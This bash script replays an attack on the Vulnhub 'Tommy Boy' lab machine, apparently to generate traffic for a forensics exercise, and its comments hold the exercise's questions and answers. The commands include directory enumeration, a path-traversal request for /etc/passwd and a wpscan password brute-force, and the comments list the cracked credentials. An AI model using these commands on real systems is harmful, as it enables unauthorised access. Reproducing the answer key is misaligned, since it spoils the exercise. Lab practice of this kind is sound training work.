#!/bin/bash


# I used the image of the virtual machine "Tommy Boy" from Vulnhub


export IP=$1

# 1. What is the URL the attacker accessed in order to login to the webpage?
/usr/bin/curl http://$IP/
/usr/bin/sleep 5
/usr/bin/curl http://$IP/robots.txt
/usr/bin/sleep 5
/usr/bin/curl http://$IP/6packsofb...soda -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/lukeiamyourfather -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/lookalivelowbridge -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/icons -L
/usr/bin/sleep 3
/usr/bin/curl http://$IP/pictures -L
/usr/bin/sleep 10
/usr/bin/curl http://$IP/richard -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/tommy -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/tommy/hi -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/tommy/hi.txt -L
/usr/bin/sleep 10
/usr/bin/curl http://$IP/richard/shockedrichard.jpg --output image.jpg
/usr/bin/sleep 10
/usr/bin/curl http://$IP/prehistoricforest -L
/usr/bin/sleep 5
/usr/bin/curl http://$IP/prehistoricforest/wp-login.php
/usr/bin/sleep 10
/usr/bin/curl "http://$IP/tommy/hi?FUZZ=../../../../../../../etc/passwd"

# 2. What CMS was the page using?
# WordPress

# 3. What are the credentials that logged the attacker on the webpage? *(How can you tell you found the right credentials)* <br/> **Format: `user:password`** 
/usr/bin/wpscan --url http://$IP/prehistoricforest/ --password-attack wp-login -U tom -P tom1.txt
/usr/bin/sleep 5
# tommy:tomtom1 

# 4. What is the URL that showed the attacker a number of possible usernames? 
# http://192.168.1.11/tommy/hi.txt

# 5. What file did the pentester actually retrieve from the machine to list the users?
# /etc/passwd

# 6. The attacker also downloaded a file from the server. What is it named?
# shockedrichard.jpg

# 7. This downloaded file hides a message. Can you figure out what it is?
# spanky (crack hash found in user comment - exifdata)

# 8. What is the first disallowed entry that is displayed by the web server?
# /6packsofb...soda

# 9. Who else is allowed to visit the web server on the other accessible port?
/usr/bin/curl -s http://$IP:8008/
/usr/bin/sleep 10
# Steve Jobs 

# 10. What are the credentials for the FTP server? <br/>  **Format: `user:password`**
./ftp.sh
/usr/bin/sleep 10

# 11. What is the name of the folder that hides a ZIP archive?
# NickIzL33t 

# 12. What kind of web attack was performed against the login form?
# bruteforce

# 13. The attacker tried a web attack but didn't succeed. What was it and what is the resource he was trying to retrieve?  **Format: `attack:file`** (use abbreaviated name of the attacka)
# /usr/bin/curl "http://$IP/tommy/hi?FUZZ=../../../../../../../etc/passwd"
# LFI:/etc/passwd

# 14. List all the available ports that the victim machine is listening on separated by commas, in ascending order.
# 22,80,8008,65534                                                                                                                                                                                                                                            
